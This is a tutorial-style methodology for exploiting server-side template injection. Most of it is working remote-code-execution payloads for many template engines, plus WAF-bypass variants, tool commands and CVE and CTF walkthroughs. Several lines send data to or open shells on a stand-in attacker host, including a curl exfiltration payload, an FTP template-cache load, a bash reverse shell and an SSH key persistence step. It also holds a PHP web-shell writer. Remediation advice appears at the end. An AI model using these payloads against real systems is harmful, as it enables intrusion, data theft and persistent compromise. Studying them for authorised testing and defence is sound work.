# Complete SSTI Exploitation Methodology

## Table of Contents
1. Understanding SSTI
2. Reconnaissance & Technology Fingerprinting
3. Manual Detection Methodology
4. Automated Scanning with Tools
5. Template Engine Identification
6. Exploitation by Engine Type
7. Real-World Case Studies
8. Blind SSTI Detection
9. WAF Bypass Techniques
10. Post-Exploitation & Remediation

---

## 1. Understanding SSTI

Server-Side Template Injection (SSTI) occurs when user input is embedded unsafely into a template engine's rendering process. Attackers inject template directives that execute on the server, leading to remote code execution (RCE), data exfiltration, or denial of service.

### How It Works

Modern web applications use template engines to generate dynamic HTML. When user input is directly concatenated into template strings rather than passed as context data, the engine may interpret malicious template directives.

**Vulnerable Code Example (Flask/Jinja2):**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/page')
def page():
    name = request.args.get('name', 'Guest')
    # DANGEROUS: User input directly embedded in template
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)
```

**Safe Code Example:**
```python
@app.route('/page')
def page():
    name = request.args.get('name', 'Guest')
    # SAFE: User input passed as context data
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
```

---

## 2. Reconnaissance & Technology Fingerprinting

Before testing for SSTI, identify the technology stack. Different template engines require different payloads.

### Tools for Fingerprinting

| Tool | Purpose | Command |
|------|---------|---------|
| Wappalyzer | Browser extension for tech detection | Install from Chrome/Firefox store |
| WhatWeb | Command-line fingerprinting | `whatweb http://target.com` |
| BuiltWith | Online technology lookup | https://builtwith.com |

### What to Look For

- **Python**: Flask, Django, FastAPI, Jinja2, Mako
- **PHP**: Laravel (Blade), Symfony (Twig), Smarty, WordPress
- **Java**: Spring Boot (Thymeleaf, Freemarker), Apache Velocity
- **JavaScript/Node.js**: Express (Pug, EJS, Handlebars), Next.js
- **Ruby**: Ruby on Rails (ERB), Sinatra

### Header Analysis

Check HTTP response headers for framework indicators:
- `Server: Werkzeug/2.0.1 Python/3.9` → Flask/Jinja2
- `X-Powered-By: PHP/7.4` → PHP-based
- `Server: Jetty` → Java-based

---

## 3. Manual Detection Methodology

### Step 1: Identify User Input Points

All parameters where user input is reflected in output are potential injection points:

| Input Location | Examples |
|----------------|----------|
| URL parameters | `?name=John&id=123` |
| POST data | Form fields, JSON bodies |
| HTTP Headers | `X-Forwarded-For`, `User-Agent`, `Referer` |
| File uploads | Filename, metadata |
| Cookies | Session values |

### Step 2: Inject Math Expression Payloads

Start with simple arithmetic to test if the engine evaluates expressions:

**Generic test payloads:**
```
{{7*7}}
${7*7}
{{7*'7'}}
{7*7}
<%= 7*7 %>
*{7*7}
```

**Expected result:** If you see `49` or `7777777` in the response, SSTI is confirmed.

### Step 3: Confirm with Engine-Specific Payloads

**For Python/Jinja2:**
```
{{ config }}
{{ self.__init__.__globals__ }}
```

**For PHP/Twig:**
```
{{ dump(app) }}
{{ _self.env }}
```

**For Java/Freemarker:**
```
${.vars}
${stacktrace}
```

### Step 4: Use Burp Suite for Efficient Testing

**Setup:**
1. Configure Burp Suite as proxy
2. Navigate through the target application
3. Send interesting requests to Repeater (Ctrl+R)

**Testing workflow in Burp Repeater:**
1. Insert test payload into a parameter
2. Send request and examine response
3. Look for mathematical evaluation (`49`)
4. Look for error messages revealing template engine
5. Test all parameters including headers

**Intruder for automated testing:**
1. Send request to Intruder (Ctrl+I)
2. Set payload position where you want to inject
3. Load SSTI payload list
4. Analyze response lengths and content

---

## 4. Automated Scanning with Tools

### Tplmap - The Standard SSTI Tool

Tplmap automates detection and exploitation of SSTI vulnerabilities .

**Installation:**
```bash
git clone https://github.com/epinna/tplmap
cd tplmap
pip install -r requirements.txt
```

**Basic Usage:**
```bash
# Detect SSTI in URL parameter
python tplmap.py -u 'http://target.com/page?name=John'

# Detect with POST data
python tplmap.py -u 'http://target.com/login' -d 'username=admin&password=*'

# OS Command execution
python tplmap.py -u 'http://target.com/page?name=John' --os-cmd 'whoami'

# Interactive OS shell
python tplmap.py -u 'http://target.com/page?name=John' --os-shell

# Upload file
python tplmap.py -u 'http://target.com/page?name=John' --upload /etc/passwd --upload-remotepath /tmp/passwd

# Reverse shell
python tplmap.py -u 'http://target.com/page?name=John' --reverse-shell 192.168.45.10 4444
```

### SSTI Scanner (Custom Python Script)

A community tool for automated SSTI detection :

```bash
# Basic usage
python3 scantemplate.py -u <URL> -k <KEY> -n <NUMBER_OF_KEYS>

# Example with form data
python3 scantemplate.py -u http://target.com/preview -k content -ok title=profile.bio=helloworld
```

### SSTImap - Enhanced Alternative

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
python3 sstimap.py -u 'http://target.com/page?name=John'
```

### Fuzzing with FFUF and qsreplace

```bash
# Collect URLs and replace parameters with test payload
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt

# Fuzz all URLs
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/

# Monitor Burp for responses containing "ssti81"
```

---

## 5. Template Engine Identification

After confirming SSTI, identify the specific template engine to craft proper exploit payloads.

### Detection Matrix

| Payload | Jinja2 (Python) | Twig (PHP) | Smarty (PHP) | Freemarker (Java) | ERB (Ruby) | Pug (Node) |
|---------|-----------------|------------|--------------|-------------------|------------|------------|
| `{{7*7}}` | 49 | 49 | Error | 49 | 49 | 49 |
| `${7*7}` | 7*7 | 7*7 | 7*7 | 49 | 7*7 | 7*7 |
| `{7*7}` | 49 | Error | 49 | Error | 7*7 | Error |
| `<%= 7*7 %>` | Error | Error | Error | Error | 49 | Error |
| `{{dump(app)}}` | Error | Output | Error | Error | Error | Error |
| `{$smarty.version}` | Error | Error | Version | Error | Error | Error |

### Error Message Analysis

Error messages often reveal the template engine:

**Jinja2 error:**
```
TemplateSyntaxError: expected token 'end of statement block', got '7'
```

**Twig error:**
```
Twig\Error\SyntaxError: Unknown tag name "7"
```

**Freemarker error:**
```
freemarker.core.InvalidReferenceException: Expression 7*7 is undefined
```

---

## 6. Exploitation by Engine Type

### Python / Jinja2 (Flask, FastAPI, Django)

**Basic RCE chain:**
```python
# Find subprocess.Popen index
{{ [].__class__.__base__.__subclasses__() }}

# Execute command (index varies by Python version)
{{ [].__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('id').read() }}

# File read
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
```

**Reliable RCE gadget (using request object):**
```python
{{ request.application.__globals__.__builtins__.__import__("os").popen("whoami").read() }}
```

**Alternative gadgets:**
```python
{{ url_for.__globals__.__builtins__.__import__("os").popen("id").read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__("os").popen("id").read() }}
```

### PHP / Twig

**Basic RCE:**
```twig
{{['id']|map('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

**File write to get shell:**
```twig
{{_self.env.setCache("ftp://attacker.com:2121")}}
{{_self.env.loadTemplate("shell.php")}}
```

### PHP / Smarty

**Version detection:**
```smarty
{$smarty.version}
```

**RCE:**
```smarty
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**Bypass disabled functions:**
```smarty
{if system('id')}{/if}
```

### Java / Freemarker

**Basic RCE:**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

**Using ObjectConstructor:**
```freemarker
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>
${ex("java.lang.ProcessBuilder","id").start()}
```

### Java / Velocity

**RCE (CVE-2016-4977):**
```velocity
#set($e=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$e.waitFor()
#set($out=$e.getInputStream())
$out.readAllBytes()
```

### Java / Thymeleaf (Spring Boot)

**RCE:**
```thymeleaf
${T(java.lang.Runtime).getRuntime().exec('id')}
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

### Node.js / Handlebars

**RCE:**
```handlebars
{{#with (lookup this.constructor.constructor 'return process.mainModule.require("child_process").execSync("whoami")')()}}{{this}}{{/with}}
```

### Node.js / Pug

**RCE:**
```pug
#{process.mainModule.require('child_process').execSync('id')}
- var x = process.mainModule.require('child_process').execSync('id')
#{x}
```

### Ruby / ERB

**RCE:**
```erb
<%= system("whoami") %>
<%= `id` %>
<%= IO.popen('id').read %>
```

---

## 7. Real-World Case Studies

### Case Study 1: Tandoor Recipes - CVE-2025-23211

**Background:** A critical SSTI vulnerability in Tandoor Recipes, an open-source meal planning application .

**Affected Versions:** <= 1.5.23

**CVSS Score:** 9.9 (Critical)

**Root Cause:** User-supplied input in recipe instructions was directly embedded into Jinja2 templates without sanitization.

**Exploitation Steps:**

1. Authenticate as a regular user
2. Create a new recipe
3. In the recipe instructions field, inject:
```python
{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(418)('whoami', shell=True, stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('decode')('utf-8') }}
```
4. View the recipe - the command executes on the server

**Impact:** In Docker Compose deployments, the application runs as root, giving attackers root-level access to the host system.

**Mitigation:** Upgrade to version 1.5.24 or later.

### Case Study 2: Bagisto E-commerce - CVE-2026-21448 & CVE-2026-21449

**Background:** Two SSTI vulnerabilities in Bagisto, a Laravel-based e-commerce platform .

**Affected Versions:** < 2.3.10

**CVE-2026-21448 - Address Field Injection:**

As a normal user:
1. Add a product to cart and proceed to checkout
2. In the address step, inject `{{7*7}}` into any address field
3. Complete the order

As an administrator:
1. Navigate to Admin → Sales → Orders
2. The injected value appears as `49` in the admin view

**CVE-2026-21449 - Profile Name Injection:**

As any authenticated user:
1. Go to customer account profile page
2. Edit first name or last name to `{{7*7}}`
3. Save - the value renders as `49`

**Impact:** Both can lead to RCE and command injection.

**Mitigation:** Upgrade to version 2.3.10 or later.

### Case Study 3: CTF Challenge - Group Chat SSTI

This challenge demonstrates advanced SSTI exploitation with input filters .

**Challenge Stack:** Flask + Jinja2

**Filters in Place:**
- Username cannot contain both `{` and `}` in the same string
- Chat messages must be alphanumeric only

**Bypass Technique - Split Payload:**

Since a username can't contain both braces, the attacker splits the payload across two usernames:

**Username 1 (opens expression and quote):**
```
{{ 7*7 ~ "
```

**Username 2 (closes quote and expression):**
```
" }}
```

**How it works:**
- Jinja's `~` operator concatenates strings
- The open double quote absorbs the `: A<br>` text between the two usernames as literal content
- The result is a complete valid Jinja expression that evaluates to `49`

**RCE Payload (split across two usernames):**

**Username 1:**
```python
{{ request.application.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read() ~ "
```

**Username 2:**
```
" }}
```

**Result:** The contents of `flag.txt` are displayed in the chat.

**Lessons Learned:**
- Simple blacklist filters (blocking `{` and `}` together) are insufficient
- Always use whitelist validation for user input
- Never use `render_template_string` with user-supplied content

### Case Study 4: BJDCTF2020 - IP Mystery

**Background:** A CTF challenge where SSTI was found in the X-Forwarded-For header .

**Discovery Process:**
1. Burp Suite was used to intercept requests
2. The `X-Forwarded-For` header was modified to `127.0.0.1{{system('ls')}}`
3. The server executed the command and returned the directory listing

**Payload Used:**
```
X-Forwarded-For: 127.0.0.1{{system('cat /flag')}}
```

**Lesson:** Always test HTTP headers as injection points, not just URL parameters and POST data.

### Case Study 5: Relate Learning System - CVE-2024-32406

**Background:** SSTI in the Batch-Issue Exam Tickets feature of Relate Learning System .

**Affected Versions:** Before 2024.1

**Root Cause:** The Ticket Format feature allowed users to specify Jinja2 templates that were evaluated without sanitization.

**File Read Payload:**
```python
{{ 'abc'.__class__.__base__.__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read() }}
```

**RCE Payload (index varies by Python version):**
```python
{{ 'abc'.__class__.__base__.__subclasses__()[210]('whoami',shell=True,stdout=-1).communicate()[0].strip() }}
```

**Impact:** Authenticated users could read arbitrary files and execute system commands.

**Mitigation:** Upgrade to version 2024.1 or later.

---

## 8. Blind SSTI Detection

Blind SSTI occurs when injection results are not directly visible in the response. Detection requires out-of-band (OOB) techniques.

### Time-Based Detection

**Python/Jinja2:**
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test','w').write('sleep 10') }}
```

**PHP/Twig:**
```twig
{{ ['sleep 10']|map('system') }}
```

### DNS/HTTP Exfiltration

**Python/Jinja2 (DNS):**
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('ping -c 1 attacker.com').read() }}
```

**Using curl for HTTP exfiltration:**
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('curl http://attacker.com/$(whoami)').read() }}
```

### Tools for Blind SSTI

**Interactsh (free OOB testing):**
```bash
# Start listener
interactsh-client

# Use generated domain in payload
{{ ''.__class__.__mro__[2].__subclasses__()[40]('ping -c 1 <interactsh-domain>').read() }}
```

**Burp Collaborator:**
1. Go to Burp → Burp Collaborator client
2. Generate a unique domain
3. Inject payload using that domain
4. Check for DNS/HTTP interactions

---

## 9. WAF Bypass Techniques

### Character Encoding

**Hex encoding:**
```python
{{ ''.__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
# becomes
{{ ''.__class__.__base__.__subclasses__()[40]('\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64').read() }}
```

**Base64:**
```python
{{ config['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f'] }}
```

### Whitespace and Comment Tricks

```python
# Add comments
{{ 7/*comment*/7 }}

# Add newlines
{{
7*7
}}

# Use alternative whitespace
{{ 7%0a*%0a7 }}
```

### String Concatenation

```python
# Avoid blacklisted words
{{ [].__class__.__base__.__subclasses__()[40]('/etc'+'/passwd').read() }}
```

### Case Manipulation

Some template engines are case-sensitive. Try different cases:

```python
{{ [] .__CLASS__.__BASE__.__SUBCLASSES__() }}
```

### Using Request Parameters

Split payload across parameters to bypass length limits or WAF rules:

```
GET /page?param1={{7*&param2=7}}
```

### Alternative Gadget Chains

If common RCE chains are blocked, find alternative paths:

**Jinja2 alternatives:**
```python
# Using cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Using joiner
{{ joiner.__init__.__globals__.os.popen('id').read() }}

# Using namespace
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

---

## 10. Post-Exploitation & Remediation

### What to Do After Confirming RCE

1. **Identify the user context:**
   ```bash
   whoami
   id
   ```

2. **Enumerate the environment:**
   ```bash
   env
   cat /etc/os-release
   uname -a
   ```

3. **Look for sensitive files:**
   ```bash
   find / -name "*.env" 2>/dev/null
   find / -name "config.php" 2>/dev/null
   find / -name "wp-config.php" 2>/dev/null
   ```

4. **Establish persistence (if authorized):**
   ```bash
   # Reverse shell
   bash -i >& /dev/tcp/attacker.com/4444 0>&1
   
   # SSH key upload
   echo "ssh-rsa AAA..." > /home/user/.ssh/authorized_keys
   ```

### Reporting Findings

When reporting an SSTI vulnerability, include:

1. **Steps to reproduce** with exact payloads
2. **Proof of concept** (screenshots or video)
3. **Impact assessment** (what an attacker could do)
4. **Affected versions** of the software
5. **Suggested remediation**

### Remediation Guidelines for Developers

**1. Never concatenate user input into templates:**
```python
# BAD
template = f"<h1>Hello, {name}!</h1>"
render_template_string(template)

# GOOD
render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
```

**2. Use template files instead of strings:**
```python
# BAD
render_template_string(user_supplied_template)

# GOOD
render_template('page.html', user_data=user_supplied_data)
```

**3. Enable sandboxing when available:**
```python
from jinja2 import SandboxedEnvironment
env = SandboxedEnvironment()
```

**4. Implement Content Security Policy (CSP):**
```http
Content-Security-Policy: script-src 'self'; object-src 'none'
```

**5. Regular security updates:**
- Keep template engines updated
- Monitor CVE databases for engine vulnerabilities

---

## Tool Reference Summary

| Tool | Purpose | Command |
|------|---------|---------|
| Tplmap | Full SSTI detection & exploitation | `python tplmap.py -u 'http://target.com?name=*'` |
| SSTImap | Enhanced SSTI tool with more engines | `python sstimap.py -u 'http://target.com?name=*'` |
| FFUF + qsreplace | Bulk parameter fuzzing | `waybackurls target.com \| qsreplace "{{9*9}}" \| ffuf -u FUZZ` |
| Burp Suite | Manual testing with Repeater/Intruder | Intercept requests, test parameters |
| Wappalyzer | Technology fingerprinting | Browser extension |
| Interactsh | Blind SSTI OOB detection | `interactsh-client` |

---

## References & Further Reading

- **Original Research:** James Kettle (PortSwigger) - "Server-Side Template Injection: RCE for the modern web app" (2015)
- **Practice Labs:** PortSwigger Web Security Academy (SSTI labs)
- **Payload Lists:** https://github.com/payloadbox/ssti-payloads
- **Tool Repository:** https://github.com/epinna/tplmap
- **CVE Database:** https://cve.mitre.org (search CWE-1336)

---
